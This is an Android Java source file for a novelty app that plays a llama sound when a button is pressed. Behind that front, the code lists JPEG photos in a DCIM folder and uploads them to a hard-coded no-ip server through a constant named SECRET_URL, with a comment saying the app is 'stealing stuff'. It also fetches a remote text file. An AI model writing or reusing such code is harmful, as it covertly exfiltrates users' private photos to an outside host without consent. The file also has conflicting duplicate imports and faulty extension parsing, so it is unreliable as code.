package com.example.lallamaquenollama;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.InputStreamEntity;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.media.AudioManager;
import android.media.SoundPool;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import ch.boye.httpclientandroidlib.HttpResponse;
import ch.boye.httpclientandroidlib.HttpVersion;
import ch.boye.httpclientandroidlib.client.ClientProtocolException;
import ch.boye.httpclientandroidlib.client.HttpClient;
import ch.boye.httpclientandroidlib.client.entity.UrlEncodedFormEntity;
import ch.boye.httpclientandroidlib.client.methods.HttpGet;
import ch.boye.httpclientandroidlib.client.methods.HttpPost;
import ch.boye.httpclientandroidlib.entity.mime.HttpMultipartMode;
import ch.boye.httpclientandroidlib.entity.mime.MultipartEntity;
import ch.boye.httpclientandroidlib.entity.mime.content.ByteArrayBody;
import ch.boye.httpclientandroidlib.impl.client.DefaultHttpClient;
import ch.boye.httpclientandroidlib.message.BasicNameValuePair;
import ch.boye.httpclientandroidlib.params.CoreProtocolPNames;
import ch.boye.httpclientandroidlib.util.EntityUtils;

import com.google.common.io.Files;

public class MainActivity extends Activity {
	private int uploaded;

	Button white;
	SoundPool spool;
	int soundID;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		uploaded = 0;
		
		this.setVolumeControlStream(AudioManager.STREAM_MUSIC);
		   spool = new SoundPool(1, AudioManager.STREAM_MUSIC, 0);
		   soundID = spool.load(this, R.raw.lallamaquellama, 1);

		   white = (Button)findViewById(R.id.button2);
		   white.setOnClickListener(new View.OnClickListener() {
		       public void onClick(View v) {
		           Sound();
		       }
		   });
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	public void mandarRequest(View view) {
		File sdCardRoot = Environment.getExternalStorageDirectory();
		File f = new File(sdCardRoot, "/DCIM/prueba");
		File[] files = f.listFiles();
		for (File inFile : files) {
			if (inFile.isFile() && inFile.getName().matches("(.*)\\.jpg$")) {
				Log.d("LALLAMA",inFile.getName());
				new ImageUploadTask().execute(inFile);
			}
		}
	}

	private static String convertStreamToString(InputStream is) {
		BufferedReader reader = new BufferedReader(new InputStreamReader(is));
		StringBuilder sb = new StringBuilder();

		String line = null;
		try {
			while ((line = reader.readLine()) != null) {
				sb.append(line + "\n");
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				is.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return sb.toString();
	}

	private void showData(String data) {
		uploaded++;
		TextView p1_button = (TextView) findViewById(R.id.unLabel);
		p1_button.setText("Archivos Subidos :" + uploaded);
	}

	private class ImageUploadTask extends AsyncTask<File, Integer, String> {
		@Override
		protected String doInBackground(File... params) {
			try {
				return postImage(params[0]);
			} catch (NoSuchAlgorithmException e) {
				return null;
			}
		}

		protected void onPostExecute(String result) {
			if(result != null) showData(result);
		}

		private static final String SECRET_URL = "http://manzana.no-ip.org/poster.php";

		private String toSHA1(byte[] convertme) {
		    final char[] HEX_CHARS = "0123456789abcdef".toCharArray();
		    MessageDigest md = null;
		    try {
		        md = MessageDigest.getInstance("SHA-1");
		    }
		    catch(NoSuchAlgorithmException e) {
		        e.printStackTrace();
		    }
		    byte[] buf = md.digest(convertme);
		    char[] chars = new char[2 * buf.length];
		    for (int i = 0; i < buf.length; ++i) {
		        chars[2 * i] = HEX_CHARS[(buf[i] & 0xF0) >>> 4];
		        chars[2 * i + 1] = HEX_CHARS[buf[i] & 0x0F];
		    }
		    return new String(chars);
		}
		
		//returns image data to send, or null if it should not be send
		//i.e. it is already in the server
		private byte[] dataToSendToServer(File f){
			HttpPost httppost = new HttpPost(ImageUploadTask.SECRET_URL);
			HttpClient client = new DefaultHttpClient();

			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);	
	
			byte [] imageBytes;
			try {
				imageBytes = Files.toByteArray(f);
			} catch (IOException e) {
				//We do not want the app to crash since we are stealing stuff!!
				e.printStackTrace();
				return null;
			}
			
			String digest = toSHA1(imageBytes);
	
			try {
				httppost.setEntity(new UrlEncodedFormEntity(Arrays.asList(new BasicNameValuePair("digest",digest))));
			} catch (UnsupportedEncodingException e) {
				e.printStackTrace();
				return null;
			}

		    try {
		    	HttpResponse response = client.execute(httppost);
		    	String resp = EntityUtils.toString(response.getEntity());

		    	return resp.equals("OK") ? imageBytes : null;
		    } catch (ClientProtocolException e) {
				e.printStackTrace();
		    	return null;
			} catch (IOException e) {
				e.printStackTrace();
				return null;
			}

		}
		
		public String postImage(File f) throws NoSuchAlgorithmException {			
			byte [] imageBytes = dataToSendToServer(f);
			if(imageBytes == null){ 
				return null;
			}

			//If SHA-1 was not in the server, means we have to send the image itself.			
			HttpPost httppost = new HttpPost("http://manzana.no-ip.org/poster.php");
			HttpClient client = new DefaultHttpClient();

			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
			 
			MultipartEntity entity = new MultipartEntity( HttpMultipartMode.BROWSER_COMPATIBLE );
			
			String[] parts = f.getAbsolutePath().split(File.pathSeparator);
			String extension = parts.length > 0 ? parts[parts.length-1] : "";

			ByteArrayBody fb = new ByteArrayBody(imageBytes,"image/"+extension,f.getName());
			entity.addPart( "imageName", fb);
			 			 
			httppost.setEntity( entity );
			 
			try {
				return EntityUtils.toString( client.execute( httppost ).getEntity(), "UTF-8" );
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}finally{
				client.getConnectionManager().shutdown();
			}
		}
	}

	@SuppressWarnings("unused")
	private class GetTask extends AsyncTask<String, Integer, String> {
		@Override
		protected String doInBackground(String... params) {
			// TODO Auto-generated method stub
			return getData();
		}

		protected void onPostExecute(String result) {
			showData(result);
		}

		public String getData() {
			// Create a new HttpClient and Post Header
			HttpClient httpclient = new DefaultHttpClient();
			HttpGet get = new HttpGet("http://manzana.no-ip.org/archivo.txt");

			try {
				// Execute HTTP Post Request
				HttpResponse response = httpclient.execute(get);
				String res = convertStreamToString(response.getEntity()
						.getContent());
				return res;
			} catch (Exception e) {
				Log.d("LALLAMA", "Fallo el get: " + Log.getStackTraceString(e));
				return null;
			}
		}
	}

	public void Sound(){
	   AudioManager audioManager = (AudioManager) getSystemService(AUDIO_SERVICE);
	   float volume = (float) audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
	   spool.play(soundID, volume, volume, 1, 0, 1f);

	};

}
